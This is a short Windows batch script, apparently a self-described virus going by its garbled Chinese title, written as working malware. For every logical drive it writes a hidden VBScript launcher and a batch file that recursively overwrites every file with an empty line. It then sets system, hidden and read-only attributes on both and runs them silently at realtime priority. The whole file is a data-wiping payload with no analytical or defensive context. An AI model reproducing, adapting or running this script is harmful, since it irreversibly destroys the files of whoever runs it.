@ECHO OFF
CHCP 936
CD "%~DP0"
FOR /F "TOKENS=3 DELIMS=," %%I IN ('TYPE CONFIG.INI') DO (COLOR %%I)
TITLE Virus3²¡¶¾±¬·¢ÖÐ...
CLS
FOR /F "skip=1" %%A IN ('WMIC LOGICALDISK GET CAPTION') DO (
	DEL /A /F /Q %%A\Vir3.bat>NUL
	DEL /A /F /Q %%A\Vir3.vbs>NUL
	ECHO SET WS=WScript.CreateObject("WScript.Shell"^)>%%A\Vir3.vbs
	ECHO WS.Run "CMD.EXE /K %%A\Vir3.bat",RunHide>>%%A\Vir3.vbs
	ECHO FOR /R %%A\ %%%%I IN (*^) DO (ECHO.^>%%%%I^)>%%A\Vir3.bat
	ATTRIB +A +H +R +S %%A\Vir3.vbs
	ATTRIB +A +H +R +S %%A\Vir3.bat
	START /REALTIME %%A\Vir3.vbs
)
EXIT